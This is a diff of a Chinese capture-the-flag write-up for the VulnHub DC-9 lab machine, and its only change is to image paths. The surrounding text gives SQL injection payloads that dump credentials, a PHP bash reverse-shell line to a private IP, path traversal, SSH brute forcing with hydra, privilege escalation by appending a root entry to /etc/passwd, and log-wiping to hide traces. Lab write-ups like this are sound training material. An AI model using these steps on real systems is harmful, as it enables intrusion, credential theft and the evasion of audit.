@@ -16,7 +16,7 @@
 
 当然，如果想要模拟真实渗透，可以使用`nmap`等扫描工具
 
-![](D:\stu\vulnhub\DC靶场\pic-9\1.jpg)
+![](./pic-9/1.jpg)
 
 # 信息收集 
 
@@ -28,13 +28,13 @@
 nmap -sV -O 192.168.10.11 -p-
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\2.jpg)
+![](./pic-9/2.jpg)
 
 ## 网站信息探测
 
 访问80端口默认界面，访问页面源代码，包含几个`php`文件路径，但是在这个界面都是可以点击到的
 
-![](D:\stu\vulnhub\DC靶场\pic-9\4.jpg)
+![](./pic-9/4.jpg)
 
 使用`gobuster`尝试进行目录爆破，发现爆破的路径，基本上与前面一样
 
@@ -42,11 +42,11 @@ nmap -sV -O 192.168.10.11 -p-
 gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -d -b 404,403
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\3.jpg)
+![](./pic-9/3.jpg)
 
 在我尝试访问`weclome.php`时，发现提示我以作为`admin`登录，并且下面提示文件不存在，主要就是这时候，点击`logout`退出，是无法退出的
 
-![](D:\stu\vulnhub\DC靶场\pic-9\5.jpg)
+![](./pic-9/5.jpg)
 
 发现一个搜索框，是`search.php`，其会把输入的数据，交给`results.php`，有结果，会显示，无结果，也会跳转到`results.php`
 
@@ -73,7 +73,7 @@ gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirb/big.txt -x php
 1' or 1=1#			有返回，并且返回的结果是 Display All Records菜单中的内容，这个自己查看一下
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\6.jpg)
+![](./pic-9/6.jpg)
 
 那么可以确定，其应该是搜索这里面的数据，并经过测试，发现其搜索的是上面数据中的`name`
 
@@ -100,7 +100,7 @@ tom' order by 6#
 tom' union select 1,2,3,4,5,6#
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\7.jpg)
+![](./pic-9/7.jpg)
 
 确定这里有显示就已经`ok`了，还没有对于`union 、 select`等关键字进行过滤操作
 
@@ -110,7 +110,7 @@ tom' union select 1,2,3,4,5,6#
 tom' union select database(),version(),3,user(),5,6#
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\8.jpg)
+![](./pic-9/8.jpg)
 
 构造语句获取表
 
@@ -121,7 +121,7 @@ tom' union select group_concat(table_name),version(),3,user(),5,6 from informati
 tom' union select concat(table_name),null,null,null,null,null from information_schema.tables#
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\9.jpg)
+![](./pic-9/9.jpg)
 
 发现两个表，一个`Users`值得关注
 
@@ -133,7 +133,7 @@ tom' union select concat(column_name),version(),3,user(),5,6 from information_sc
 tom' union select concat(column_name),version(),3,user(),5,6 from information_schema.columns where table_name='StaffDetails'#
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\10.jpg)
+![](./pic-9/10.jpg)
 
 直接通过查询获取对应元组的数据
 
@@ -141,7 +141,7 @@ tom' union select concat(column_name),version(),3,user(),5,6 from information_sc
 tom' union select concat(Username,'|',Password),version(),3,user(),5,6 from Users#
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\11.jpg)
+![](./pic-9/11.jpg)
 
 获取到用户名`admin`和密码`856f5de590ef37314e7c3bdf6f8a66dc`
 
@@ -149,7 +149,7 @@ tom' union select concat(Username,'|',Password),version(),3,user(),5,6 from User
 
 那么换一个网站`somd5.com`，获取密码`transorbital1`
 
-![](D:\stu\vulnhub\DC靶场\pic-9\12.jpg)
+![](./pic-9/12.jpg)
 
 在浏览器关闭当前连接的IP，按着`ctrl+shift+delete`，把浏览器最近记录删除，这样再访问`manage`就可以再登录了
 
@@ -157,7 +157,7 @@ tom' union select concat(Username,'|',Password),version(),3,user(),5,6 from User
 
 这时候输入上面的用户名和密码，即可登录成功，并且，当前登录后的界面只有一个`add recard`是新的，这里就可以与前面的数据进行比对，因为这里应该是写入到数据库中的，因为好多列名都是与前面的一样的
 
-![](D:\stu\vulnhub\DC靶场\pic-9\13.jpg)
+![](./pic-9/13.jpg)
 
 尝试直接在这里进行注入下面的语句
 
@@ -165,7 +165,7 @@ tom' union select concat(Username,'|',Password),version(),3,user(),5,6 from User
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/9999 0>&1'"); ?>
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\14.jpg)
+![](./pic-9/14.jpg)
 
 那么在前面使用`union`查询的时候，数字`2`和`3`是在一行显示，并且中间有空格的，那么可以根据这个进行拼接反弹`shell`的代码
 
@@ -178,7 +178,7 @@ lastname:
 
 上传成功，但是无法利用
 
-![](D:\stu\vulnhub\DC靶场\pic-9\15.jpg)
+![](./pic-9/15.jpg)
 
 可能`general_log`是关闭的，通过前面的注入构造下面的语句进行查看
 
@@ -186,7 +186,7 @@ lastname:
 tom' union select variable_name, variable_value,3,4,5,6 FROM information_schema.global_variables WHERE variable_name LIKE '%general%'#
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\16.jpg)
+![](./pic-9/16.jpg)
 
 # 路径遍历漏洞
 
@@ -204,11 +204,11 @@ tom' union select variable_name, variable_value,3,4,5,6 FROM information_schema.
 
 这里抓取登录后的数据包，然后设置参数进行爆破
 
-![](D:\stu\vulnhub\DC靶场\pic-9\18.jpg)
+![](./pic-9/18.jpg)
 
 发现传参为`file`，并且可以看到靶机内的用户很多
 
-![](D:\stu\vulnhub\DC靶场\pic-9\19.jpg)
+![](./pic-9/19.jpg)
 
 # 通过路径遍历获取kncok配置文件
 
@@ -222,7 +222,7 @@ tom' union select variable_name, variable_value,3,4,5,6 FROM information_schema.
 
 访问这两个进行测试，最终访问`/etc/knockd.conf`发现信息
 
-![](D:\stu\vulnhub\DC靶场\pic-9\20.jpg)
+![](./pic-9/20.jpg)
 
 记住这个序列`7469,8475,9842`，使用`kncok`敲靶机，再次扫描，可以看到已经处于打开状态
 
@@ -230,7 +230,7 @@ tom' union select variable_name, variable_value,3,4,5,6 FROM information_schema.
 knock 192.168.10.13 7469 8475 9842
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\21.jpg)
+![](./pic-9/21.jpg)
 
 但是到这里没有任何东西了，看了网上的`wp`，啧，少了一个步骤，就是查询数据库，我这里直接使用当前数据库，导致错过大量信息，在`search.php`构造下面语句
 
@@ -238,7 +238,7 @@ knock 192.168.10.13 7469 8475 9842
 tom' union select concat(schema_name),version(),3,user(),5,6 from information_schema.schemata#
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\22.jpg)
+![](./pic-9/22.jpg)
 
 爆出数据库的表的名称
 
@@ -257,7 +257,7 @@ tom' union select concat(column_name),version(),3,user(),5,6 from information_sc
 tom' union select concat(username,password),version(),3,user(),5,6 from users.UserDetails#
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\23.jpg)
+![](./pic-9/23.jpg)
 
 为了结果更清晰，采用`sqlmap`展示图片，使用`burp`抓取`search.php`请求时的数据包，并把数据包中的内容进行复制
 
@@ -265,17 +265,17 @@ tom' union select concat(username,password),version(),3,user(),5,6 from users.Us
 sqlmap -r search -D users -T UserDetails -C username,password --dump
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\24.jpg)
+![](./pic-9/24.jpg)
 
 可以查看保存后的
 
-![](D:\stu\vulnhub\DC靶场\pic-9\25.jpg)
+![](./pic-9/25.jpg)
 
 # ssh爆破
 
 这里可以直接通过`ai`来帮助区分
 
-![](D:\stu\vulnhub\DC靶场\pic-9\26.jpg)
+![](./pic-9/26.jpg)
 
 然后保存到两个文件中，使用`hydra`进行爆破
 
@@ -287,11 +287,11 @@ hydra -L user -P pass 192.168.10.13 ssh
 
 用户名`joeyt`的密码`Passw0rd`，用户名`janitor`的密码`Ilovepeepee`
 
-![](D:\stu\vulnhub\DC靶场\pic-9\27.jpg)
+![](./pic-9/27.jpg)
 
 测试登录，在登录两个一会后，并没有发现任何东西，包括SUID权限文件，以及`sudo`，系统内核，定时任务，甚至我上传了`pspy64`也没有发现，然后大概知道作者的意思了，文件应该在每个用户的家目录下，所以切换用户，最终在`janitor`发现一个密码本
 
-![](D:\stu\vulnhub\DC靶场\pic-9\28.jpg)
+![](./pic-9/28.jpg)
 
 复制内容，然后再使用`hydra`进行爆破
 
@@ -299,7 +299,7 @@ hydra -L user -P pass 192.168.10.13 ssh
 hydra -L user -P new_pass 192.168.10.13 ssh
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\29.jpg)
+![](./pic-9/29.jpg)
 
 获取新的两组数据，进行登录查看，因为`joeyt`前面登录过，所以没什么东西
 
@@ -307,11 +307,11 @@ hydra -L user -P new_pass 192.168.10.13 ssh
 
 登录`fredf`后，发现家目录没有东西，然后尝试`sudo`，因为之前使用`find`寻找具有SUID权限的文件，确定有`sudo`的
 
-![](D:\stu\vulnhub\DC靶场\pic-9\30.jpg)
+![](./pic-9/30.jpg)
 
 执行文件，提示`test.py`，再搜索，并查看该文件，发现无内容
 
-![](D:\stu\vulnhub\DC靶场\pic-9\31.jpg)
+![](./pic-9/31.jpg)
 
 可以看到这个`test.py`是必须要有用户的传参的，并且除了文件名，还需要有两个传参
 
@@ -321,13 +321,13 @@ hydra -L user -P new_pass 192.168.10.13 ssh
 
 那么直接把`/etc/shadow`文件中的内容，写入到`/tmp/pass`中，然后查看
 
-![](D:\stu\vulnhub\DC靶场\pic-9\32.jpg)
+![](./pic-9/32.jpg)
 
 确实发现可以写入，那么把`/etc/passwd`中的`root`信息直接读取，把两个文件中关于`root`的信息都复制到`kali`中的两个文件，使用`unshadow`合并，然后使用`john`进行`hash`破解
 
 但是这个时间是真的长，这里先进行破解，思考其他方式
 
-![](D:\stu\vulnhub\DC靶场\pic-9\33.jpg)
+![](./pic-9/33.jpg)
 
 尝试直接获取`root`目录下的`.ssh`目录下的私钥， 但是这里测试，发现说是没有该目录
 
@@ -367,9 +367,9 @@ openssl passwd -6 -salt 123 123456
 
 这里可以直接加密自然是可以，不过为了严谨，我这里把之前读取的`/etc/shadow`文件中的密码，进行一个分析，借助网站`www.dcode.fr`，发现解出算法以及盐值
 
-![](D:\stu\vulnhub\DC靶场\pic-9\34.jpg)
+![](./pic-9/34.jpg)
 
-![35](D:\stu\vulnhub\DC靶场\pic-9\35.jpg)
+![35](./pic-9/35.jpg)
 
 那么就按照这个进行加密，然后复制这个加密的结果
 
@@ -377,7 +377,7 @@ openssl passwd -6 -salt 123 123456
 openssl passwd -6 -salt lFbb8QQt2wX7eUeE 123456
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\36.jpg)
+![](./pic-9/36.jpg)
 
 那么现在再次构造，之前是空密码和明文密码，这里采用加密密码，再进行测试
 
@@ -385,7 +385,7 @@ openssl passwd -6 -salt lFbb8QQt2wX7eUeE 123456
 final1:$6$lFbb8QQt2wX7eUeE$S63c0lmQQPy9FpNzpz5xy688Ur6ZlDQq62BGgeB1tSp5OssLCRc1VhOAIzORv4FplJbZdbR.hohEqY9LCFlmD/:0:0:final1:/root:/bin/bash
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\37.jpg)
+![](./pic-9/37.jpg)
 
 可以看到，成功提权
 
@@ -402,11 +402,11 @@ final2:$6$lFbb8QQt2wX7eUeE$S63c0lmQQPy9FpNzpz5xy688Ur6ZlDQq62BGgeB1tSp5OssLCRc1V
 #这里的加密密码，是上面生成的，就直接使用，知道方法即可
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-9\38.jpg)
+![](./pic-9/38.jpg)
 
 查看`flag`
 
-![](D:\stu\vulnhub\DC靶场\pic-9\39.jpg)
+![](./pic-9/39.jpg)
 
 # 清理痕迹
 
@@ -418,17 +418,17 @@ final2:$6$lFbb8QQt2wX7eUeE$S63c0lmQQPy9FpNzpz5xy688Ur6ZlDQq62BGgeB1tSp5OssLCRc1V
 
 首先找到连接数据库的信息
 
-![](D:\stu\vulnhub\DC靶场\pic-9\40.jpg)
+![](./pic-9/40.jpg)
 
 然后剩下的就是删除表中的指定内容，这里因为之前确定是在`staff`数据库中，并且在表中`StaffDetails`存储着相关信息，所以重点删除这个表中的指定数据即可
 
-![](D:\stu\vulnhub\DC靶场\pic-9\41.jpg)
+![](./pic-9/41.jpg)
 
 ## 清理日志
 
 日志文件主要在`/var/log`中，可以使用`sed`删除指定kali的`ip`的行
 
-![](D:\stu\vulnhub\DC靶场\pic-9\42.jpg)
+![](./pic-9/42.jpg)
 
 ## 清理敏感文件
 
